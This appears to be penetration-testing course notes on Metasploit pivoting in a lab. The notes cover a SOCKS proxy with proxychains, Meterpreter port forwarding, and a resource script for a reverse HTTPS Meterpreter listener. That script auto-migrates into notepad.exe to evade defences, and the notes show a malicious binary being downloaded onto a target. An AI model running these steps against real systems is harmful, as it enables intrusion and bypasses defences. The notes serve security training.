msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5
msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/socks_proxy) > 
[*] Starting the SOCKS proxy server
```
- We can now update our proxychains conf to utilize the SOCKS5 proxy.

We can now use `proxychains` to run `xfreerdp` to obtain GUI access from our Kali sys to target on internal network.
```
### --- Increase socket timout of proxychains ---

┌──(operator@labhost)-[~/OffSec/msf]
└─$ less /etc/proxychains.conf

### Some timeouts in milliseconds
tcp_read_time_out 30000
tcp_connect_time_out 30000

### --- Proxy to internal RDP ---

┌──(operator@labhost)-[~/OffSec/msf]
└─$ sudo proxychains xfreerdp /v:172.16.128.200 /u:luiza
```
- Increase socket timeout if proxy conn fails.
- We have successfully pivoted through compromised host.

We can use a similar technique for port forwarding with the `portfwd` command within the Meterpreter session, which forwards a port to the internal network.
```
msf6 auxiliary(server/socks_proxy) > sessions  -i 42
[*] Starting interaction with 42...

meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h   Help banner.
    -i   Index of the port forward entry to interact with (see the "list" command).
    -l   Forward: local port to listen on. Reverse: local port to connect to.
    -L   Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
    -r   Forward: remote host to connect to.
    -R   Indicates a reverse port forward.
```

We create a local port forward from 4389 localhost to 3389 of the target host.
```
meterpreter > portfwd add -l 4389 -p 3389 -r 172.16.128.200
[*] Forward TCP relay created: (local) :4389 -> (remote) 172.16.128.200:3389
```

We can test by connecting to `127.0.0.1:4389` with `xfreerdp`.
```
┌──(operator@labhost)-[~/OffSec/msf]
└─$ xfreerdp /v:127.0.0.1:4389 /u:luiza /timeout:20000
```

#### 20.4 Automating Metasploit
 
- Create resource scripts.
- Use [resource scripts](https://docs.rapid7.com/metasploit/resource-scripts/) in Metasploit.

##### Resource Scripts

MSF resource scripts chain together a series of console comands and Ruby code.  We can use either built-in commands of Metasploit or write Ruby code to manage control flow and develop advanced logic components.

In a pentest we may need to setup several multi/handler listeners each time we want to receive an incoming reverse shell.  We could let Metasploit run in the background the whole time or start Metasploit and manually start a listener each time.  We could also create a resource script to automate this.

Let's create a script that starts a multi/handler listener for a non-staged Win x64 Meterpreter payload.  To do this we create a file in home dir of Kali named `listener.rc` and open it a text editor.

We first need to determine the command sequence we want to use.  In this example, the first command activates the multi/handler module.  Next we set the payload, `windows/meterpreter_reverse_https`, the we set our `LHOST` and `LPORT` options.
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
```

Additionally we can configure the `AutoRunScript` option to automatically exec a mod after a session is created.  In this example we will use `post/windows/manage/migrate` module.  This will cause the spawned Meterpreter to automatically launch a background `notepad.exe` process to migrate to.  Automating process migration helps to avoid situations where our payload is killed prematurely by defensive technology or termination of the process.
```
set AutoRunScript post/windows/manage/migrate
```

We also set `ExitOnSession` to `false` to ensure that the listener keeps accepting new connections after a session is created.
```
set ExitOnSession false
```
*We can also configure advanced options such as ExitOnSession in multi/handler and AutoRunScript in payloads by using show advanced within the activated module or selected payload.*

Finally we add `run` with args `-z -j` to run it as a job in the bg and stop us from automatically interacting with the session.
```
run -z -j
```

Save the script and start Metasploit by passing the resource script as arg for `-r`.
```
sudo msfconsole -r listener.rc
```

Or import it into a running session.
```
msf6 > resource listener.rc 
[*] Processing /home/operator/OffSec/msf/listener.rc for ERB directives.
resource (/home/operator/OffSec/msf/listener.rc)> use exploit/multi/handler
[*] Using configured payload windows/x64/meterpreter_reverse_https
resource (/home/operator/OffSec/msf/listener.rc)> set PAYLOAD windows/meterpreter_reverse_https
PAYLOAD => windows/meterpreter_reverse_https
resource (/home/operator/OffSec/msf/listener.rc)> set LHOST 192.168.45.207
LHOST => 192.168.45.207
resource (/home/operator/OffSec/msf/listener.rc)> set LPORT 443
LPORT => 443
resource (/home/operator/OffSec/msf/listener.rc)> set AutoRunScript post/windows/manage/migrate
AutoRunScript => post/windows/manage/migrate
resource (/home/operator/OffSec/msf/listener.rc)> set ExitOnSession false
ExitOnSession => false
resource (/home/operator/OffSec/msf/listener.rc)> run -z -j
[*] Exploit running as background job 3.
[*] Exploit completed, but no session was created.

[*] Started HTTPS reverse handler on https://192.168.45.207:443
```
- All of our commands were executed from the script.

let's connect to BRUTE2 via RDP with user `justin` and password `SuperS3cure1337#`, start PowerShell, download our mal Win bin `met.exe` that we used previously.
```
[!] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Redirecting stageless connection from /FNYmHRbQWmG7KLoq3kt59QhAdFPJvMnkV2S9mtqTtNlFmz-DxmF6tOosWU1xpKfaFFO2HoI6fTmcJJ8YS with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0'
[!] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Attaching orphaned/stageless session...
[!] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Without a database connected that payload UUID tracking will not work!
[*] Session ID 44 (192.168.45.207:443 -> 192.168.205.202:60820) processing AutoRunScript 'post/windows/manage/migrate'
[*] Running module against BRUTE2
[*] Current server process: mtr.exe (3660)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 5752
[+] Successfully migrated into process 5752
[*] Meterpreter session 44 opened (192.168.45.207:443 -> 192.168.205.202:60820) at 2023-11-26 14:13:55 -0800
```
- Metasploit automatically migrated the session to the newly spawned process.

Instead of creating our own resource scripts we can use the scripts provided by Metasploit found in `/usr/share/metasploit-framework/scripts/resource`.
```
┌──(operator@labhost)-[~/OffSec/msf]
└─$ ls -l /usr/share/metasploit-framework/scripts/resource
total 156
-rw-r--r-- 1 root root  7270 Aug 24 03:07 auto_brute.rc
-rw-r--r-- 1 root root  2203 Aug 24 03:07 autocrawler.rc
-rw-r--r-- 1 root root 11225 Aug 24 03:07 auto_cred_checker.rc
-rw-r--r-- 1 root root  6565 Aug 24 03:07 autoexploit.rc
-rw-r--r-- 1 root root  3422 Aug 24 03:07 auto_pass_the_hash.rc
-rw-r--r-- 1 root root   876 Aug 24 03:07 auto_win32_multihandler.rc
-rw-r--r-- 1 root root   155 Aug 24 03:07 bap_all.rc
-rw-r--r-- 1 root root   762 Aug 24 03:07 bap_dryrun_only.rc
-rw-r--r-- 1 root root   365 Aug 24 03:07 bap_firefox_only.rc
-rw-r--r-- 1 root root   358 Aug 24 03:07 bap_flash_only.rc
-rw-r--r-- 1 root root   354 Aug 24 03:07 bap_ie_only.rc
-rw-r--r-- 1 root root 20767 Aug 24 03:07 basic_discovery.rc
-rw-r--r-- 1 root root  4518 Aug 24 03:07 dev_checks.rc
-rw-r--r-- 1 root root  3358 Aug 24 03:07 fileformat_generator.rc
-rw-r--r-- 1 root root  1085 Aug 24 03:07 meterpreter_compatibility.rc
-rw-r--r-- 1 root root  1064 Aug 24 03:07 mssql_brute.rc
-rw-r--r-- 1 root root  4346 Aug 24 03:07 multi_post.rc
-rw-r--r-- 1 root root  1222 Aug 24 03:07 nessus_vulns_cleaner.rc
-rw-r--r-- 1 root root  1659 Aug 24 03:07 oracle_login.rc
-rw-r--r-- 1 root root   840 Aug 24 03:07 oracle_sids.rc
-rw-r--r-- 1 root root   490 Aug 24 03:07 oracle_tns.rc
-rw-r--r-- 1 root root   833 Aug 24 03:07 port_cleaner.rc
-rw-r--r-- 1 root root  2419 Aug 24 03:07 portscan.rc
-rw-r--r-- 1 root root  1251 Aug 24 03:07 run_all_post.rc
-rw-r--r-- 1 root root   333 Aug 24 03:07 run_cve-2022-22960_lpe.rc
-rw-r--r-- 1 root root  3084 Aug 24 03:07 smb_checks.rc
-rw-r--r-- 1 root root  3837 Aug 24 03:07 smb_validate.rc
-rw-r--r-- 1 root root  2592 Aug 24 03:07 wmap_autotest.rc
```
- There are resource scripts provided for.
 - Port scanning.
 - Brute forcing.
 - Protocol enumerations.
 - And many more.
- Before using them.
 - Examine.
 - Understand.
 - Modify to fit our needs.

Some scripts use the global datastore of Metasploit to set options like `RHOSTS`.  When we use `set` or `unset` we define options in the context of a running module.  We can also define values for options across all mods by setting *global* options, with `setg` and `unsetg`.

Resource scripts can automate parts of pentests.  We can create a set of resource scripts for repetative tasks and operations.  We can prepare those scripts and then modify them for each pentest.  Example, we can prepare resource scripts for listeners, pivoting, post-exploitation, etc.  Using them for multiple tests can save a lot of time.
